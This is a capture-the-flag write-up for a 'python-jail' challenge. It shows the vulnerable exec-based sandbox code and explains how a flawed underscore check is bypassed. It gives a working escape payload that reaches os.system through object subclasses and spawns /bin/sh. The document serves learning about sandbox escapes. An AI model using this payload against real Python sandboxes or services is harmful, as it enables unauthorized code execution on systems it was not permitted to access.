# python-jail

## problem

```py
#!/usr/bin/env python 

blacklist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

security_check = lambda s: any(c in blacklist for c in s) and s.count('_') < 50

def main():
    while True: 
        cmds = input("> ")
        if security_check(cmds):
            print("nope.")
        else:
            exec(cmds, {'__builtins__': None}, {})
    

if __name__ == "__main__":
    main()
```

## solution

here, the vulnerability is in the `security_check` function.

the security check makes sure the count of underscores is above 50 for the check to pass (to return `False`), so adding a comment and then a bunch of underscores works because the code is evaluated using exec

so the solution is as follows

```
().__class__.__base__.__subclasses__()[-4].__init__.__globals__['system']('/bin/sh') # ________________________________________________________________________________________________________________________________________________
```

builtins is None but we have the Dockerfile so we can get the subclasses of `object` and then find os._wrap_close and then get the system function to achieve RCE.
